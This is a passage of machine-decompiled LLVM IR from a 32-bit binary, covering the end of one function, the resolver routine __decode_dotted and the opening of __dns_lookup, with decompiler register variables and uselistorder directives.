  %v0_8066ccf = load i32, i32* @edi, align 4
  %v1_8066ccf = add i32 %v0_8066ccf, 1
  br label %dec_label_pc_8066cd0

dec_label_pc_8066cd0:                             ; preds = %dec_label_pc_8066cc4, %dec_label_pc_8066cbf, %dec_label_pc_8066ccc
  %v0_8066cd4 = phi i32 [ %v0_8066ccc, %dec_label_pc_8066cc4 ], [ %v0_8066c4419, %dec_label_pc_8066cbf ], [ %v1_8066ccf, %dec_label_pc_8066ccc ]
  store i32 %v2_8066c24, i32* %edx.global-to-local, align 4
  %v1_8066cd4 = add i32 %v0_8066cd4, 1
  store i32 %v1_8066cd4, i32* %eax.global-to-local, align 4
  %v1_8066cd7 = inttoptr i32 %v0_8066cd4 to i8*
  store i8 0, i8* %v1_8066cd7, align 1
  %v0_8066cda = load i32, i32* %eax.global-to-local, align 4
  %v1_8066cda = load i32, i32* %edx.global-to-local, align 4
  %v2_8066cda = sub i32 %v0_8066cda, %v1_8066cda
  store i32 %v2_8066cda, i32* @eax, align 4
  %tmp67 = icmp ugt i32 %v2_8066cda, %arg4
  br i1 %tmp67, label %dec_label_pc_8066d12, label %dec_label_pc_8066cf0

dec_label_pc_8066cf0:                             ; preds = %dec_label_pc_8066cd0
  %tmp45 = bitcast i8** %stack_var_12 to i32*
  %v3_8066cf32 = load i32, i32* %tmp45, align 4
  %v0_8066cfa.cast = inttoptr i32 %v3_8066cf32 to i8*
  %v5_8066cfa = call i32 @strcpy(i8* %v0_8066cfa.cast, i32 %v2_8066c24)
  store i32 %v5_8066cfa, i32* %eax.global-to-local, align 4
  store i32 %v5_8066cfa, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8066d14

dec_label_pc_8066d12:                             ; preds = %dec_label_pc_8066cd0, %dec_label_pc_8066b62
  %storemerge = phi i32 [ 28, %dec_label_pc_8066cd0 ], [ 97, %dec_label_pc_8066b62 ]
  store i32 -8, i32* %eax.global-to-local, align 4
  store i32 %storemerge, i32* inttoptr (i32 -8 to i32*), align 8
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8066d14

dec_label_pc_8066d14:                             ; preds = %dec_label_pc_8066c6f, %dec_label_pc_8066cf0, %dec_label_pc_8066b6d, %dec_label_pc_8066d12
  %v0_8066d17 = phi i32 [ 0, %dec_label_pc_8066c6f ], [ %v5_8066cfa, %dec_label_pc_8066cf0 ], [ %v3_8066b79, %dec_label_pc_8066b6d ], [ 0, %dec_label_pc_8066d12 ]
  store i32 %v0_8066d17, i32* %eax.global-to-local, align 4
  ret i32 %v0_8066d17

; uselistorder directives
  uselistorder i32 %v0_8066d17, { 1, 0 }
  uselistorder i32 %v0_8066cd4, { 1, 0 }
  uselistorder i1 %v10_8066cbf, { 1, 0 }
  uselistorder i32 %v0_8066cbf.pre, { 1, 0, 2 }
  uselistorder i32 %v1_8066cb5, { 0, 2, 1 }
  uselistorder i32 %v1_8066c51, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v0_8066c4e57, { 0, 3, 2, 1 }
  uselistorder i32 %v1_8066c4058, { 1, 0 }
  uselistorder i32 %v0_8066c4a59, { 3, 2, 1, 0 }
  uselistorder i32 %v2_8066c24, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8066c1f, { 1, 0, 2 }
  uselistorder i32 %v1_8066c14, { 1, 0 }
  uselistorder i32 %v5_8066c1c, { 1, 2, 0 }
  uselistorder i32 %v1_8066c1f.pre, { 3, 1, 0, 2 }
  uselistorder i32 %v1_8066bf7, { 0, 2, 1 }
  uselistorder i32 %v0_8066be78, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8066bf212, { 1, 2, 0, 3 }
  uselistorder i1 %v10_8066be2, { 1, 0 }
  uselistorder i32 %v0_8066c0d61, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8066c0262, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8066bf764, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_8066baf, { 2, 0, 1, 4, 3 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %ecx.global-to-local, { 4, 5, 0, 2, 1, 3, 6, 7, 8 }
  uselistorder i32* %eax.global-to-local, { 0, 19, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 97, { 4, 6, 5, 0, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @sprintf, { 3, 2, 1, 0 }
  uselistorder i8 58, { 6, 7, 8, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 15, { 1, 6, 10, 5, 11, 9, 2, 8, 7, 3, 4, 0 }
  uselistorder i64 4294967296, { 0, 1, 3, 2, 4, 5, 6, 7 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 4, 0, 3 }
  uselistorder label %dec_label_pc_8066d14, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8066cd0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8066cb5, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8066c31, { 1, 0 }
  uselistorder label %dec_label_pc_8066c1f, { 1, 0 }
  uselistorder label %dec_label_pc_8066c0f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8066c0b, { 1, 0 }
  uselistorder label %dec_label_pc_8066bf7, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8066bf4, { 1, 0 }
  uselistorder label %dec_label_pc_8066bca, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_8066d21 = load i32, i32* @edi, align 4
  %v0_8066d22 = load i32, i32* @esi, align 4
  %v4_8066d27 = icmp eq i32 %arg1, 0
  store i32 %arg2, i32* %edx.global-to-local, align 4
  br i1 %v4_8066d27, label %dec_label_pc_8066e1b, label %dec_label_pc_8066d36

dec_label_pc_8066d36:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  %v5_8066d4b3040 = sub i32 %arg2, %arg3
  %v11_8066d4b3141 = xor i32 %arg2, %arg3
  %v12_8066d4b3242 = xor i32 %v5_8066d4b3040, %arg2
  %v13_8066d4b3343 = and i32 %v12_8066d4b3242, %v11_8066d4b3141
  %v14_8066d4b3444 = icmp slt i32 %v13_8066d4b3343, 0
  %v16_8066d4b3646 = icmp slt i32 %v5_8066d4b3040, 0
  %v2_8066d4f3747 = icmp eq i1 %v16_8066d4b3646, %v14_8066d4b3444
  br i1 %v2_8066d4f3747, label %dec_label_pc_8066e1b, label %dec_label_pc_8066d55.lr.ph

dec_label_pc_8066d55.lr.ph:                       ; preds = %dec_label_pc_8066d36, %dec_label_pc_8066d8a
  %storemerge.ph50 = phi i32 [ %storemerge39, %dec_label_pc_8066d8a ], [ 0, %dec_label_pc_8066d36 ]
  %v0_8066d6e.ph48 = phi i32 [ %v2_8066dab, %dec_label_pc_8066d8a ], [ %arg2, %dec_label_pc_8066d36 ]
  %stack_var_-21.1.ph49 = phi i1 [ true, %dec_label_pc_8066d8a ], [ false, %dec_label_pc_8066d36 ]
  %v3_8066d71 = select i1 %stack_var_-21.1.ph49, i32 2, i32 1
  %v1_8066df7 = icmp eq i1 %stack_var_-21.1.ph49, false
  br label %dec_label_pc_8066d55

dec_label_pc_8066d55:                             ; preds = %dec_label_pc_8066d55.lr.ph, %dec_label_pc_8066dca
  %storemerge39 = phi i32 [ %storemerge.ph50, %dec_label_pc_8066d55.lr.ph ], [ %v0_8066d47.pre, %dec_label_pc_8066dca ]
  %v0_8066d6e38 = phi i32 [ %v0_8066d6e.ph48, %dec_label_pc_8066d55.lr.ph ], [ %v0_8066d4b.pre.pre, %dec_label_pc_8066dca ]
  %v2_8066d59 = add i32 %v0_8066d6e38, %arg1
  %v3_8066d59 = inttoptr i32 %v2_8066d59 to i8*
  %v4_8066d59 = load i8, i8* %v3_8066d59, align 1
  %v5_8066d59 = zext i8 %v4_8066d59 to i32
  %v4_8066d5c = icmp eq i8 %v4_8066d59, 0
  br i1 %v4_8066d5c, label %dec_label_pc_8066e0f, label %dec_label_pc_8066d64

dec_label_pc_8066d64:                             ; preds = %dec_label_pc_8066d55
  store i32 %v5_8066d59, i32* %ebx.global-to-local, align 4
  %v1_8066d6e = add i32 %v0_8066d6e38, 1
  %v0_8066d71 = load i32, i32* %ebp.global-to-local, align 4
  %v4_8066d71 = add i32 %v3_8066d71, %v0_8066d71
  store i32 %v4_8066d71, i32* %ebp.global-to-local, align 4
  %v1_8066d74 = and i32 %v5_8066d59, 192
  %v6_8066d79 = icmp eq i32 %v1_8066d74, 192
  %v1_8066d7e = icmp eq i1 %v6_8066d79, false
  br i1 %v1_8066d7e, label %dec_label_pc_8066daf, label %dec_label_pc_8066d80

dec_label_pc_8066d80:                             ; preds = %dec_label_pc_8066d64
  %v5_8066d80 = sub i32 %v1_8066d6e, %arg3
  %v11_8066d80 = xor i32 %v1_8066d6e, %arg3
  %v12_8066d80 = xor i32 %v5_8066d80, %v1_8066d6e
  %v13_8066d80 = and i32 %v12_8066d80, %v11_8066d80
  %v14_8066d80 = icmp slt i32 %v13_8066d80, 0
  %v16_8066d80 = icmp slt i32 %v5_8066d80, 0
  %v2_8066d84 = icmp eq i1 %v16_8066d80, %v14_8066d80
  br i1 %v2_8066d84, label %dec_label_pc_8066e1b, label %dec_label_pc_8066d8a

dec_label_pc_8066d8a:                             ; preds = %dec_label_pc_8066d80
  store i32 %v5_8066d59, i32* %edx.global-to-local, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8066d99 = add i32 %v1_8066d6e, %arg1
  %v3_8066d99 = inttoptr i32 %v2_8066d99 to i8*
  %v4_8066d99 = load i8, i8* %v3_8066d99, align 1
  %v5_8066d99 = zext i8 %v4_8066d99 to i32
  store i32 %v5_8066d99, i32* @eax, align 4
  %v4_8066d9d = add i32 %v3_8066d71, %v4_8066d71
  store i32 %v4_8066d9d, i32* %ebp.global-to-local, align 4
  %v1_8066da0 = mul nuw nsw i32 %v5_8066d59, 256
  %v2_8066da3 = and i32 %v1_8066da0, 16128
  %v2_8066dab = or i32 %v5_8066d99, %v2_8066da3
  store i32 %v2_8066dab, i32* %edx.global-to-local, align 4
  %v5_8066d4b30 = sub i32 %v2_8066dab, %arg3
  %v13_8066d4b33 = and i32 %v5_8066d4b30, %arg3
  %v14_8066d4b34 = icmp slt i32 %v13_8066d4b33, 0
  %v16_8066d4b36 = icmp slt i32 %v5_8066d4b30, 0
  %v2_8066d4f37 = icmp eq i1 %v16_8066d4b36, %v14_8066d4b34
  br i1 %v2_8066d4f37, label %dec_label_pc_8066e1b, label %dec_label_pc_8066d55.lr.ph

dec_label_pc_8066daf:                             ; preds = %dec_label_pc_8066d64
  %v2_8066db3 = add i32 %v5_8066d59, %storemerge39
  %v1_8066db7 = add i32 %v2_8066db3, 1
  store i32 %v1_8066db7, i32* @esi, align 4
  %v10_8066db8 = icmp ult i32 %v1_8066db7, %arg5
  store i32 %v2_8066db3, i32* %stack_var_-28, align 4
  %v1_8066dbf = icmp eq i1 %v10_8066db8, false
  br i1 %v1_8066dbf, label %dec_label_pc_8066e1b, label %dec_label_pc_8066dc1

dec_label_pc_8066dc1:                             ; preds = %dec_label_pc_8066daf
  %v2_8066dc1 = add i32 %v5_8066d59, %v1_8066d6e
  store i32 %v2_8066dc1, i32* @edi, align 4
  %v10_8066dc4 = icmp ult i32 %v2_8066dc1, %arg3
  %v1_8066dc8 = icmp eq i1 %v10_8066dc4, false
  br i1 %v1_8066dc8, label %dec_label_pc_8066e1b, label %dec_label_pc_8066dca

dec_label_pc_8066dca:                             ; preds = %dec_label_pc_8066dc1
  %v2_8066dd0 = add i32 %v1_8066d6e, %arg1
  %v5_8066dd7 = add i32 %storemerge39, %arg4
  %v3_8066ddc = inttoptr i32 %v5_8066dd7 to i8*
  %v4_8066ddc = call i32 @memcpy(i8* %v3_8066ddc, i32 %v2_8066dd0, i32 %v5_8066d59)
  %v0_8066de4 = load i32, i32* @edi, align 4
  store i32 %v0_8066de4, i32* %edx.global-to-local, align 4
  %v0_8066dea = load i32, i32* %ebp.global-to-local, align 4
  %v1_8066dea = load i32, i32* %ebx.global-to-local, align 4
  store i32 %arg4, i32* %ebx.global-to-local, align 4
  %v2_8066dea = select i1 %v1_8066df7, i32 %v1_8066dea, i32 0
  %v4_8066df7 = add i32 %v2_8066dea, %v0_8066dea
  store i32 %v4_8066df7, i32* %ebp.global-to-local, align 4
  %v2_8066dfe = load i32, i32* %stack_var_-28, align 4
  store i32 46, i32* @eax, align 4
  %v4_8066e07 = add i32 %v2_8066dfe, %arg4
  %v5_8066e07 = inttoptr i32 %v4_8066e07 to i8*
  store i8 46, i8* %v5_8066e07, align 1
  %v0_8066d47.pre = load i32, i32* @esi, align 4
  %v0_8066d4b.pre.pre = load i32, i32* %edx.global-to-local, align 4
  %v5_8066d4b = sub i32 %v0_8066d4b.pre.pre, %arg3
  %v11_8066d4b = xor i32 %v0_8066d4b.pre.pre, %arg3
  %v12_8066d4b = xor i32 %v5_8066d4b, %v0_8066d4b.pre.pre
  %v13_8066d4b = and i32 %v12_8066d4b, %v11_8066d4b
  %v14_8066d4b = icmp slt i32 %v13_8066d4b, 0
  %v16_8066d4b = icmp slt i32 %v5_8066d4b, 0
  %v2_8066d4f = icmp eq i1 %v16_8066d4b, %v14_8066d4b
  br i1 %v2_8066d4f, label %dec_label_pc_8066e1b, label %dec_label_pc_8066d55

dec_label_pc_8066e0f:                             ; preds = %dec_label_pc_8066d55
  %v0_8066e14 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8066e16 = zext i1 %stack_var_-21.1.ph49 to i32
  %v3_8066e16 = add i32 %v0_8066e14, 1
  %v4_8066e16 = add i32 %v3_8066e16, %v2_8066e16
  br label %dec_label_pc_8066e1e

dec_label_pc_8066e1b:                             ; preds = %dec_label_pc_8066dca, %dec_label_pc_8066daf, %dec_label_pc_8066dc1, %dec_label_pc_8066d36, %dec_label_pc_8066d8a, %dec_label_pc_8066d80, %entry
  br label %dec_label_pc_8066e1e

dec_label_pc_8066e1e:                             ; preds = %dec_label_pc_8066e0f, %dec_label_pc_8066e1b
  %storemerge1 = phi i32 [ -1, %dec_label_pc_8066e1b ], [ %v4_8066e16, %dec_label_pc_8066e0f ]
  store i32 %v0_8066d22, i32* @esi, align 4
  store i32 %v0_8066d21, i32* @edi, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v5_8066d4b, { 1, 0 }
  uselistorder i32 %v0_8066d4b.pre.pre, { 2, 1, 0, 3 }
  uselistorder i32 %v5_8066d4b30, { 1, 0 }
  uselistorder i32 %v2_8066dab, { 1, 2, 0 }
  uselistorder i32 %v5_8066d80, { 1, 0 }
  uselistorder i32 %v1_8066d6e, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 %v5_8066d59, { 6, 2, 3, 0, 1, 5, 4 }
  uselistorder i32 %storemerge39, { 2, 1, 0 }
  uselistorder i1 %stack_var_-21.1.ph49, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ebp.global-to-local, { 4, 0, 2, 1, 3, 5, 6 }
  uselistorder i1 true, { 0, 1158, 1152, 1153, 1159, 1160, 1161, 1162, 1163, 1156, 1164, 1172, 1173, 1174, 1165, 1154, 1166, 1167, 1157, 1168, 1169, 1170, 1171, 1175, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 1122, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 1146, 1147, 1148, 1149, 1150, 1155, 1151 }
  uselistorder i32 %arg4, { 0, 2, 1 }
  uselistorder i32 %arg3, { 5, 6, 8, 0, 3, 4, 7, 1, 2 }
  uselistorder i32 %arg1, { 0, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_8066e1e, { 1, 0 }
  uselistorder label %dec_label_pc_8066e1b, { 0, 2, 1, 4, 5, 3, 6 }
  uselistorder label %dec_label_pc_8066d55, { 1, 0 }
  uselistorder label %dec_label_pc_8066d55.lr.ph, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-508 = alloca i32, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v4_8066e32 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8066e32, i32* @ebx, align 4
  %v2_8066e3e = call i32 @malloc(i32 512)
  store i32 %v2_8066e3e, i32* %eax.global-to-local, align 4
  %v0_8066e43 = load i32, i32* @ebx, align 4
  %v4_8066e43 = inttoptr i32 %v0_8066e43 to i8*
  %v1_8066e46 = inttoptr i32 %v2_8066e3e to i8*
  store i32 %v2_8066e3e, i32* @ebp, align 4
  %v3_8066e48 = call i32 @strlen(i8* %v4_8066e43)
  store i32 %v3_8066e48, i32* %eax.global-to-local, align 4
  %v12_8066e4d = ptrtoint i32* %stack_var_-508 to i32
  %v9_8066e50 = icmp eq i32 %v3_8066e48, 894
  store i1 %v9_8066e50, i1* %zf.global-to-local, align 1
  %tmp84 = icmp ult i32 %v3_8066e48, 895
  br i1 %tmp84, label %dec_label_pc_8066e70, label %dec_label_pc_806755a

dec_label_pc_8066e70:                             ; preds = %entry
  %v1_8066e77 = add i32 %v3_8066e48, 130
  %v9_8066e77 = icmp eq i32 %v1_8066e77, 0
  store i1 %v9_8066e77, i1* %zf.global-to-local, align 1
  store i32 %v1_8066e77, i32* %eax.global-to-local, align 4
  %v2_8066e7d = call i32 @malloc(i32 %v1_8066e77)
  store i32 %v2_8066e7d, i32* %eax.global-to-local, align 4
  %v2_8066e89 = icmp eq i32 %v2_8066e3e, 0
  store i1 %v2_8066e89, i1* %zf.global-to-local, align 1
  br i1 %v2_8066e89, label %dec_label_pc_8067552, label %dec_label_pc_8066e91

dec_label_pc_8066e91:                             ; preds = %dec_label_pc_8066e70
  %v1_8066e91 = icmp eq i32 %v2_8066e7d, 0
  store i1 %v1_8066e91, i1* %zf.global-to-local, align 1
  br i1 %v1_8066e91, label %dec_label_pc_8067552, label %dec_label_pc_8066e99

dec_label_pc_8066e99:                             ; preds = %dec_label_pc_8066e91
  %v0_8066e99 = load i32, i32* @ebx, align 4
  %v1_8066e99 = inttoptr i32 %v0_8066e99 to i8*
  %v2_8066e99 = load i8, i8* %v1_8066e99, align 1
  %v3_8066e99 = icmp eq i8 %v2_8066e99, 0
  store i1 %v3_8066e99, i1* %zf.global-to-local, align 1
  br i1 %v3_8066e99, label %dec_label_pc_8067552, label %dec_label_pc_8066ea2

dec_label_pc_8066ea2:                             ; preds = %dec_label_pc_8066e99
  store i32 %v3_8066e48, i32* %eax.global-to-local, align 4
  %v2_8066ea6 = add i32 %v3_8066e48, -1
  %v3_8066ea6 = add i32 %v2_8066ea6, %v0_8066e99
  %v4_8066ea6 = inttoptr i32 %v3_8066ea6 to i8*
  %v5_8066ea6 = load i8, i8* %v4_8066ea6, align 1
  %v6_8066ea6 = zext i8 %v5_8066ea6 to i32
  %v8_8066ea6 = and i32 %v3_8066e48, -256
  %v9_8066ea6 = or i32 %v6_8066ea6, %v8_8066ea6
  store i32 %v9_8066ea6, i32* %eax.global-to-local, align 4
  %v8_8066eb4 = inttoptr i32 %v2_8066e7d to i8*
  %v6_8066eb8 = call i32 @memcpy(i8* %v8_8066eb4, i32 %v0_8066e99, i32 %v3_8066e48)
  store i32 %v6_8066eb8, i32* @eax, align 4
  %v0_8066edd = load i32, i32* @esp, align 4
  %v6_8066edd = icmp eq i32 %v0_8066edd, -16
  store i1 %v6_8066edd, i1* %zf.global-to-local, align 1
  store i32 %v3_8066e48, i32* %ecx.global-to-local, align 4
  %v2_8066ee8 = add i32 %v3_8066e48, 1
  %v3_8066ee8 = add i32 %v2_8066ee8, %v2_8066e7d
  store i32 %v3_8066ee8, i32* %edx.global-to-local, align 4
  %v3_8066f19 = inttoptr i32 %v3_8066ee8 to i32*
  %v3_8066fdb = inttoptr i32 %v3_8066ee8 to i8*
  br label %dec_label_pc_8066ef0

dec_label_pc_8066ef0:                             ; preds = %dec_label_pc_8067542, %dec_label_pc_8066ea2
  %v0_8066ef7 = phi i32 [ %v0_8067546, %dec_label_pc_8067542 ], [ %v12_8066e4d, %dec_label_pc_8066ea2 ]
  %v1_8066ef0 = add i32 %v0_8066ef7, 32
  %v2_8066ef0 = inttoptr i32 %v1_8066ef0 to i32*
  %v3_8066ef0 = load i32, i32* %v2_8066ef0, align 4
  %v13_8066ef0 = icmp eq i32 %v3_8066ef0, -1
  store i1 %v13_8066ef0, i1* %zf.global-to-local, align 1
  br i1 %v13_8066ef0, label %dec_label_pc_8066f06, label %dec_label_pc_8066ef7

dec_label_pc_8066ef7:                             ; preds = %dec_label_pc_8066ef0
  %v9_8066ef7 = icmp eq i32 %v0_8066ef7, 12
  store i1 %v9_8066ef7, i1* %zf.global-to-local, align 1
  %v3_8066efa = load i32, i32* %v2_8066ef0, align 4
  %v5_8066efa = add i32 %v0_8066ef7, -16
  %v6_8066efa = inttoptr i32 %v5_8066efa to i32*
  store i32 %v3_8066efa, i32* %v6_8066efa, align 4
  %v1_8066efe = call i32 @__GI___libc_close(i32 %v3_8066ee8)
  store i32 %v1_8066efe, i32* %eax.global-to-local, align 4
  %v0_8066f03 = load i32, i32* @esp, align 4
  %v1_8066f03 = add i32 %v0_8066f03, 16
  %v6_8066f03 = icmp eq i32 %v1_8066f03, 0
  store i1 %v6_8066f03, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8066f06

dec_label_pc_8066f06:                             ; preds = %dec_label_pc_8066ef0, %dec_label_pc_8066ef7
  %v1_8066f06 = phi i32 [ %v0_8066ef7, %dec_label_pc_8066ef0 ], [ %v1_8066f03, %dec_label_pc_8066ef7 ]
  %v0_8066f06 = load i32, i32* @esi, align 4
  %v2_8066f06 = add i32 %v1_8066f06, -4
  %v3_8066f06 = inttoptr i32 %v2_8066f06 to i32*
  store i32 %v0_8066f06, i32* %v3_8066f06, align 4
  %v1_8066f07 = add i32 %v1_8066f06, -8
  %v2_8066f07 = inttoptr i32 %v1_8066f07 to i32*
  store i32 ptrtoint (i32* @global_var_8078848.1714 to i32), i32* %v2_8066f07, align 4
